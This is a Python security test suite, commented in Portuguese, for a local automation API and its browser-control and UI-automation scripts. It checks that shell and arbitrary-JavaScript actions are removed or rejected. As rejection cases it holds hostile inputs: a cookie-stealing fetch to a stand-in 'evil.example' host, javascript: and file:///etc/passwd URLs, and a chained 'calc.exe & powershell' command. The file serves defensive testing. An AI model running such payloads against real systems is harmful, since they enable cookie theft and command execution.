"""Testes de segurança para app/api/automation.py, system/ui-automation.py e
system/browser-control.py.

Contexto (ver JARVIS_MASTER.md §22/§25, decisão de 2026-09-05):

    ARBITRARY SHELL VIA API      = FORBIDDEN
    ARBITRARY JAVASCRIPT VIA API = FORBIDDEN
    BROWSER AUTOMATION           = ALLOWED THROUGH BOUNDED OPERATIONS

Este arquivo foi escrito ANTES da correção (RED) e reaproveitado DEPOIS da
correção (GREEN) — mesmo teste, código sob teste diferente. O relatório da
tarefa registra a saída real de rodar isto nos dois momentos.

Por que a metodologia varia por arquivo:
- `system/browser-control.py` importa normalmente em Linux (só stdlib +
  `websockets` opcional) — testado com import dinâmico + monkeypatch de
  `cdp_send` (nunca precisa de um Chrome real rodando).
- `system/ui-automation.py` usa `ctypes.windll`/`uiautomation`/`comtypes` no
  nível de módulo — NÃO importa fora do Windows. Testado por análise
  estática do código-fonte (AST + varredura de texto), o que tem a vantagem
  de funcionar em qualquer SO (inclusive CI) e de expressar o invariante de
  segurança diretamente ("este arquivo nunca pode conter shell=True/uma
  handler chamada 'shell'"), em vez de depender de conseguir executar o
  módulo.
- `app/api/automation.py` importa normalmente (só depende de fastapi) —
  testado via import direto das funções de validação, mais alguns testes
  de rota via TestClient só para o caminho de REJEICAO (que nunca chega a
  spawnar o subprocess real, então funciona igual em qualquer SO).
"""

from __future__ import annotations

import ast
import importlib.util
import sys
import unittest
from pathlib import Path
from types import ModuleType
from typing import Any

PROJECT_ROOT = Path(__file__).resolve().parents[1]
SYSTEM_DIR = PROJECT_ROOT / "system"


def _load_module_from_path(name: str, path: Path) -> ModuleType:
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


# =============================================================================
# system/ui-automation.py — análise estática (o módulo não importa fora do
# Windows; ver docstring do arquivo)
# =============================================================================
class UiAutomationStaticSecurityTests(unittest.TestCase):
    """Prova, sem precisar importar/rodar o módulo, que nenhum caminho de
    execução de shell arbitrário existe em system/ui-automation.py."""

    @classmethod
    def setUpClass(cls) -> None:
        cls.path = SYSTEM_DIR / "ui-automation.py"
        cls.source = cls.path.read_text(encoding="utf-8")
        cls.tree = ast.parse(cls.source, filename=str(cls.path))

    def _find_dict_literal_named(self, name: str) -> ast.Dict | None:
        for node in ast.walk(self.tree):
            if (
                isinstance(node, ast.Assign)
                and len(node.targets) == 1
                and isinstance(node.targets[0], ast.Name)
                and node.targets[0].id == name
                and isinstance(node.value, ast.Dict)
            ):
                return node.value
        return None

    def test_handlers_dict_exists(self) -> None:
        handlers = self._find_dict_literal_named("HANDLERS")
        self.assertIsNotNone(handlers, "HANDLERS dict nao encontrado — arquivo mudou de forma inesperada.")

    def test_no_shell_key_in_handlers(self) -> None:
        handlers = self._find_dict_literal_named("HANDLERS")
        assert handlers is not None
        keys = [k.value for k in handlers.keys if isinstance(k, ast.Constant)]
        self.assertNotIn(
            "shell",
            keys,
            "HANDLERS ainda registra uma acao 'shell' — execucao de comando arbitrario via API continua possivel.",
        )

    def test_no_action_shell_function_defined(self) -> None:
        function_names = {
            node.name for node in ast.walk(self.tree) if isinstance(node, ast.FunctionDef)
        }
        self.assertNotIn(
            "action_shell",
            function_names,
            "Funcao action_shell ainda existe no arquivo (mesmo que fora de HANDLERS) — risco residual.",
        )

    def test_no_subprocess_call_uses_shell_true(self) -> None:
        offending_lines: list[int] = []
        for node in ast.walk(self.tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            is_subprocess_call = (
                isinstance(func, ast.Attribute)
                and func.attr in {"Popen", "run", "call", "check_call", "check_output"}
                and isinstance(func.value, ast.Name)
                and func.value.id == "subprocess"
            )
            if not is_subprocess_call:
                continue
            for kw in node.keywords:
                if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                    offending_lines.append(node.lineno)
        self.assertEqual(
            offending_lines,
            [],
            f"subprocess.*(shell=True) encontrado nas linhas {offending_lines} — "
            "isso e exatamente o padrao de execucao de shell arbitrario que deve deixar de existir.",
        )

    def test_no_eval_exec_or_os_system(self) -> None:
        offending: list[str] = []
        for node in ast.walk(self.tree):
            if isinstance(node, ast.Call):
                func = node.func
                if isinstance(func, ast.Name) and func.id in {"eval", "exec"}:
                    offending.append(f"{func.id}() na linha {node.lineno}")
                if (
                    isinstance(func, ast.Attribute)
                    and func.attr == "system"
                    and isinstance(func.value, ast.Name)
                    and func.value.id == "os"
                ):
                    offending.append(f"os.system() na linha {node.lineno}")
        self.assertEqual(offending, [], f"Encontrado(s): {offending}")

    def test_docstring_example_no_longer_advertises_shell(self) -> None:
        # O docstring do arquivo tinha um exemplo de uso literal com
        # {"type":"shell", ...} — isso nao deveria continuar documentado/
        # incentivado mesmo que o handler tenha sido removido em outro lugar.
        module_docstring = ast.get_docstring(self.tree) or ""
        self.assertNotIn(
            '"type":"shell"',
            module_docstring.replace(" ", ""),
            "Docstring do modulo ainda anuncia um exemplo de uso com type=shell.",
        )


# =============================================================================
# system/browser-control.py — import dinamico + monkeypatch (roda em
# qualquer SO, nao precisa de Chrome real)
# =============================================================================
class BrowserControlSecurityTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.mod = _load_module_from_path("browser_control_security_test", SYSTEM_DIR / "browser-control.py")

    def setUp(self) -> None:
        self.cdp_calls: list[tuple[Any, ...]] = []

        def fake_cdp_send(tab_index, method, params=None, timeout=10):
            self.cdp_calls.append((tab_index, method, params))
            return {"frameId": "fake-frame", "result": {"value": "ok"}}

        self._real_cdp_send = self.mod.cdp_send
        self.mod.cdp_send = fake_cdp_send

    def tearDown(self) -> None:
        self.mod.cdp_send = self._real_cdp_send

    # --- estrutural: execute_js precisa ter deixado de existir --------------

    def test_execute_js_removed_from_commands(self) -> None:
        self.assertNotIn(
            "execute_js",
            self.mod.COMMANDS,
            "COMMANDS ainda registra 'execute_js' — execucao de JS arbitrario via CDP continua possivel.",
        )

    def test_cmd_execute_js_function_removed(self) -> None:
        self.assertFalse(
            hasattr(self.mod, "cmd_execute_js"),
            "cmd_execute_js ainda existe no modulo (mesmo que fora de COMMANDS).",
        )

    def test_dispatch_rejects_execute_js_end_to_end(self) -> None:
        import io
        import json as _json
        import contextlib

        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            self.mod.dispatch(_json.dumps({"cmd": "execute_js", "code": "1+1"}))
        response = _json.loads(buf.getvalue().strip())
        self.assertFalse(response["ok"])
        self.assertEqual(self.cdp_calls, [], "Nenhuma chamada CDP deveria ter acontecido para um comando desconhecido.")

    # --- URL policy: schemes perigosos bloqueados ---------------------------

    def test_javascript_url_rejected(self) -> None:
        allowed, _ = self.mod.is_allowed_navigation_url("javascript:alert(document.cookie)")
        self.assertFalse(allowed)

    def test_file_url_rejected(self) -> None:
        allowed, _ = self.mod.is_allowed_navigation_url("file:///etc/passwd")
        self.assertFalse(allowed)

    def test_data_url_rejected(self) -> None:
        allowed, _ = self.mod.is_allowed_navigation_url("data:text/html,<script>alert(1)</script>")
        self.assertFalse(allowed)

    def test_vbscript_url_rejected(self) -> None:
        allowed, _ = self.mod.is_allowed_navigation_url("vbscript:msgbox(1)")
        self.assertFalse(allowed)

    def test_unknown_scheme_rejected(self) -> None:
        allowed, _ = self.mod.is_allowed_navigation_url("chrome-extension://abcdef/x.html")
        self.assertFalse(allowed)

    def test_schemeless_url_rejected(self) -> None:
        allowed, _ = self.mod.is_allowed_navigation_url("example.com/path")
        self.assertFalse(allowed)

    def test_https_url_allowed(self) -> None:
        allowed, _ = self.mod.is_allowed_navigation_url("https://example.com/dashboard")
        self.assertTrue(allowed)

    def test_http_url_allowed(self) -> None:
        allowed, _ = self.mod.is_allowed_navigation_url("http://127.0.0.1:9222/json")
        self.assertTrue(allowed)

    # --- cmd_navigate: a rejeicao acontece ANTES de qualquer chamada CDP ---

    def test_navigate_blocks_javascript_url_before_any_cdp_call(self) -> None:
        self.mod.cmd_navigate({"tab": 0, "url": "javascript:alert(1)"})
        self.assertEqual(
            self.cdp_calls,
            [],
            "cmd_navigate chamou cdp_send mesmo com uma URL javascript: — a validacao nao esta bloqueando antes do envio.",
        )

    def test_navigate_blocks_file_url_before_any_cdp_call(self) -> None:
        self.mod.cmd_navigate({"tab": 0, "url": "file:///etc/passwd"})
        self.assertEqual(self.cdp_calls, [])

    def test_navigate_allows_legitimate_https_url(self) -> None:
        self.mod.cmd_navigate({"tab": 0, "url": "https://example.com"})
        self.assertEqual(len(self.cdp_calls), 1)
        tab, method, params = self.cdp_calls[0]
        self.assertEqual(method, "Page.navigate")
        self.assertEqual(params["url"], "https://example.com")

    # --- regressao: operacoes bounded legitimas continuam funcionando ------

    def test_click_still_dispatches_via_cdp(self) -> None:
        import json as _json

        def fake_cdp_send(tab_index, method, params=None, timeout=10):
            self.cdp_calls.append((tab_index, method, params))
            return {"result": {"value": _json.dumps({"x": 1.0, "y": 2.0, "tag": "BUTTON"})}}

        self.mod.cdp_send = fake_cdp_send
        self.mod.cmd_click({"tab": 0, "selector": "#submit"})
        methods_called = [c[1] for c in self.cdp_calls]
        self.assertIn("Runtime.evaluate", methods_called)
        self.assertIn("Input.dispatchMouseEvent", methods_called)

    def test_fill_still_dispatches_via_cdp(self) -> None:
        import json as _json

        def fake_cdp_send(tab_index, method, params=None, timeout=10):
            return {"result": {"value": _json.dumps({"ok": True, "tag": "INPUT", "selector": "#name"})}}

        self.mod.cdp_send = fake_cdp_send
        result_holder = {}

        def spy_ok(cmd, data=None):
            result_holder["cmd"] = cmd
            result_holder["data"] = data

        self.mod.ok = spy_ok
        self.mod.cmd_fill({"tab": 0, "selector": "#name", "value": "Leles"})
        self.assertEqual(result_holder.get("cmd"), "fill")

    def test_get_text_still_dispatches_via_cdp(self) -> None:
        import json as _json

        def fake_cdp_send(tab_index, method, params=None, timeout=10):
            return {"result": {"value": _json.dumps({"text": "hello"})}}

        self.mod.cdp_send = fake_cdp_send
        result_holder = {}

        def spy_ok(cmd, data=None):
            result_holder["cmd"] = cmd
            result_holder["data"] = data

        self.mod.ok = spy_ok
        self.mod.cmd_get_text({"tab": 0, "selector": "#title"})
        self.assertEqual(result_holder.get("data", {}).get("text"), "hello")

    def test_connect_and_list_tabs_and_screenshot_still_registered(self) -> None:
        for legit_cmd in ("connect", "list_tabs", "navigate", "get_dom", "click", "fill", "get_text", "wait_for", "screenshot"):
            self.assertIn(legit_cmd, self.mod.COMMANDS, f"comando legitimo '{legit_cmd}' nao deveria ter sido removido.")


# =============================================================================
# app/api/automation.py — validadores puros (import direto; so precisa de
# fastapi instalado, nao spawna nenhum subprocess real)
# =============================================================================
class AutomationApiAllowlistTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        sys.path.insert(0, str(PROJECT_ROOT))
        import app.api.automation as automation_module  # noqa: PLC0415

        cls.automation = automation_module

    def test_validate_workflow_actions_rejects_shell(self) -> None:
        error = self.automation._validate_workflow_actions([{"type": "shell", "command": "whoami"}])
        self.assertIsNotNone(error)

    def test_validate_workflow_actions_rejects_shell_with_chaining(self) -> None:
        error = self.automation._validate_workflow_actions(
            [{"type": "shell", "command": "dir & calc.exe & powershell -c whoami"}]
        )
        self.assertIsNotNone(error)

    def test_validate_workflow_actions_rejects_powershell_disguised_as_click(self) -> None:
        # mesmo um "type" desconhecido/forjado deve cair no allowlist, nao so o literal "shell"
        error = self.automation._validate_workflow_actions([{"type": "powershell", "command": "Get-Process"}])
        self.assertIsNotNone(error)

    def test_validate_workflow_actions_allows_known_safe_types(self) -> None:
        for safe_type in ("click", "type", "key", "scroll", "wait", "screenshot", "app_focus"):
            with self.subTest(safe_type=safe_type):
                error = self.automation._validate_workflow_actions([{"type": safe_type}])
                self.assertIsNone(error)

    def test_validate_browser_control_cmd_rejects_execute_js(self) -> None:
        error = self.automation._validate_browser_control_cmd("execute_js")
        self.assertIsNotNone(error)

    def test_validate_browser_control_cmd_allows_navigate(self) -> None:
        error = self.automation._validate_browser_control_cmd("navigate")
        self.assertIsNone(error)

    def test_validate_browser_control_cmd_allows_known_safe_cmds(self) -> None:
        for safe_cmd in ("connect", "list_tabs", "navigate", "click", "fill", "get_text", "screenshot"):
            with self.subTest(safe_cmd=safe_cmd):
                error = self.automation._validate_browser_control_cmd(safe_cmd)
                self.assertIsNone(error)


class AutomationApiRouteRejectionTests(unittest.TestCase):
    """Testes de rota reais via TestClient — só o caminho de REJEIÇÃO, que
    nunca chega a chamar `_run_script`/spawnar subprocess, então funciona
    igual em qualquer SO (o caminho de sucesso real depende de
    ui-automation.py/pyautogui/Chrome reais — só existe no Windows)."""

    @classmethod
    def setUpClass(cls) -> None:
        sys.path.insert(0, str(PROJECT_ROOT))
        from fastapi.testclient import TestClient  # noqa: PLC0415
        from app.main import create_app  # noqa: PLC0415

        cls.client = TestClient(create_app())

    def test_post_workflow_with_shell_action_is_rejected_with_400(self) -> None:
        response = self.client.post(
            "/api/workflow",
            json={"name": "test", "actions": [{"type": "shell", "command": "whoami"}]},
        )
        self.assertEqual(response.status_code, 400)

    def test_post_computer_use_task_with_shell_action_is_rejected_with_400(self) -> None:
        response = self.client.post(
            "/api/computer-use/task",
            json={"actions": [{"type": "shell", "command": "calc.exe"}]},
        )
        self.assertEqual(response.status_code, 400)

    def test_post_browser_control_execute_js_is_rejected_with_400(self) -> None:
        response = self.client.post(
            "/api/browser-control",
            json={"cmd": "execute_js", "code": "fetch('https://evil.example/steal?c='+document.cookie)"},
        )
        self.assertEqual(response.status_code, 400)


if __name__ == "__main__":
    unittest.main()
